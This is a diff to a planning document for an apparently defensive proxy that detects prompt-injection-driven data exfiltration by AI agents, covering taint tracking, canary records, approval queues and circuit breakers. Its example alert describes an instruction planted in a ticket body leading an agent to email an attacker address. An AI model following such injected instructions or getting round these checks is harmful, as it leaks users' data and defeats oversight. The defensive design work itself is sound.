@@ -57,6 +57,26 @@ touch (parallelism key — no two in-flight tickets may overlap).
   - Oversize input triggers a loud ALERT/raise with `{payload_size, cap, action}` logged — no silent
     truncation (firm rule: bounded + fail-loud).
   - Detector returns a verdict object consumable by T4.
+  - *Adjacent-knowledge mechanisms (see `planning/ADJACENT.md` §6a):*
+    - **Destination provenance** (Confirmation of Payee / BEC new-payee rule): recipients, URL hosts and
+      webhooks are extracted from tool args. A destination that is absent from the user's turn and the
+      allowlist and that appears only in untrusted tool output → BLOCK with reason `payee_not_confirmed`.
+    - **Source→sink flow rule** (taint mode / Rule of Two / danger theory): session flags
+      A = untrusted input, B = sensitive read, C = egress/state change. A+B then C → block/escalate.
+      An untrusted substring (≥8-char shingle) copied into sink args is a high-confidence hit.
+    - **Per-session canaries + seeded fake records** (canary trap / mountweazels): canaries minted per
+      `session+tool` and indistinguishable from real secrets; 3–5 fake "Agloe" records seeded into readable
+      data; the egress scan also checks base64/hex/URL-decoded forms. The alert names session, fetching tool and
+      sink. Block vs alert is set per sink. The canary registry is bounded (TTL/LRU) and fails loud when full.
+    - **Fail-closed** (dead-man switch): scanner timeout/crash, oversize input, or a full ledger/registry →
+      deny egress + ALERT. Never forward silently.
+    - **Per-tool policy with `report-only` | `enforce` modes** (HACCP critical limits / envelope protection /
+      CSP report-only): declarative `policy.json` per tool (allowlist, path jail, byte cap, banned tools,
+      pre-declared action). Pure function, no LLM in the decision. Report-only logs would-block verdicts.
+      Maps onto T2's observe/block config.
+    - **Cumulative caps** (velocity / anti-structuring): a `session+tool` ledger over count, summed
+      amount/bytes, and N calls each just under the single-call cap → HOLD + alert. The ledger is bounded and
+      overflow raises.
 - **Gate notes:** tester-gate — payloads >8KB **and** multi-hundred-row tool outputs; delete-the-fix
   proof (≥3 RED pre-fix, GREEN post-fix) for any bug; se-gate — every cap documented with its failure mode.
 
@@ -72,6 +92,10 @@ touch (parallelism key — no two in-flight tickets may overlap).
   - A sample verdict renders a valid AIDR-shaped alert JSON (schema documented).
   - Each detector rule maps to its ATLAS/ATT&CK + OWASP + ASI + OASB tags via a single mapping table.
   - Mapping is data-driven (table/config), not hard-coded per call site.
+  - **Narrative case card** (SAR narrative / lot trace, see `planning/ADJACENT.md` §6a): every alert carries
+    a one-paragraph who/what/when/where/why, e.g. "Instruction originated in `ticket#4411` body → influenced
+    `send_email(to=attacker@x)` → blocked by `payee_not_confirmed`", plus the provenance edges
+    (source → tool call → sink). Attribution names the tainted *source*, not just the session.
 - **Gate notes:** se-gate — schema versioned; reviewer-gate — tags cite the frameworks in RESEARCH.md.
 
 ## T5 — Dashboard
@@ -86,6 +110,9 @@ touch (parallelism key — no two in-flight tickets may overlap).
   - Incident graph highlights the malicious node and glowing taint path.
   - Latency and trust-score render; alert feed lists AIDR alerts from T4.
   - Handles a data-rich capture (multi-hundred-row tool output) without stalling or truncating the graph.
+  - Renders the T4 **narrative case card** next to each alert, so a reviewer sees where the instruction came
+    from and not just "blocked" (see `planning/ADJACENT.md` §6a).
+  - Shows the **benign-run FP rate** from T7 beside the detection rate (headline pair).
 - **Gate notes:** delivery-gate — replay runs on real captures; tester-gate — data-rich capture, latency
   measured and displayed.
 
@@ -112,6 +139,10 @@ touch (parallelism key — no two in-flight tickets may overlap).
   - Produces a table: precision, recall, median + p95 latency across the corpus.
   - Compares detector verdict vs `dvaa{}` label per case; false pos / false neg itemized.
   - Runs headless and deterministically from `captures/`.
+  - **False-positive rate on benign runs is a headline metric**, reported beside recall
+    (see `planning/ADJACENT.md` §6a, §8 "FP economics trap"). The corpus includes benign (non-attack) DVAA
+    sessions that exercise egress tools legitimately. Each benign block is itemized with the rule that fired.
+    Rules can be scored in both `report-only` and `enforce` modes.
 - **Gate notes:** tester-gate — real seams (real detector, not a mock), full corpus incl. >8KB cases;
   delivery-gate — latency numbers reproduced on a clean run.
 
@@ -149,6 +180,30 @@ touch (parallelism key — no two in-flight tickets may overlap).
 - **S3** AIT alert-feed slice — render detections as a SOC feed using a tiny pre-indexed AIT slice.
   Scope: `sentinel/dashboard/ait/`.
 - **S4** Drop-in guardrail one-liner — closing-slide "add one line, get the proxy" packaging. Scope: `sentinel/proxy/`.
+
+*From the adjacent-knowledge analysis (`planning/ADJACENT.md` §6b). Each one passed the per-mechanism
+precondition test but is heavier than the deterministic core:*
+- **S5** Approval queue (BEC callback / maker-checker / two-person integrity) — `PENDING_APPROVAL` for
+  egress/write calls **after taint only** (approval fatigue). The dashboard shows tool, args, **taint source** and
+  risk, with approve/deny and auto-deny on timeout. Any LLM judge must never see untrusted context. Deps: T3, T5.
+  Scope: `sentinel/proxy/approval/`, `sentinel/dashboard/approval/`.
+- **S6** Quarantine / circuit breaker (immunology quarantine / aviation fuse) — CLOSED → OPEN after N
+  detections → HALF_OPEN read-only. Egress returns "held for review". Per-source scoping + explicit reset,
+  so an attacker can't use it for DoS. Deps: T3. Scope: `sentinel/proxy/breaker/`.
+- **S7** Capability downgrade after taint (new-hire probation / POLA) — CLEAN → TAINTED state machine over a
+  manifest annotated `read|write|egress`. TAINTED sessions get read tools only or route to S5. Deps: T3.
+  Scope: `sentinel/detectors/capability/`.
+- **S8** Intent-alignment check ("does this match the request?") — deterministic task-verb → allowed-tools
+  map from the *trusted* user turn, plus an optional context-stripped judge. It can raise risk and is never the sole gate.
+  Deps: T3. Scope: `sentinel/detectors/intent/`.
+- **S9** Tool-manifest integrity (tamper-evident seal) — HMAC the tool definitions + system prompt at
+  startup and verify per call. A mid-session change (MCP rug pull) → alert. This is a detection control and is not
+  described as blocking. Deps: T2. Scope: `sentinel/proxy/manifest/`.
+
+**Explicitly excluded — learned behavioral baselines** (AML customer profiles, SPC control charts,
+Forrest-style n-gram "self" models). They need history we won't have: a handful of benign runs is noise
+or easy to game, and a poisoned warm-up learns the attack as "self". Not a ticket, not a stretch. Use the
+deterministic velocity/destination-novelty rules in T3 instead (`planning/ADJACENT.md` §4, §6d).
 
 ---
 
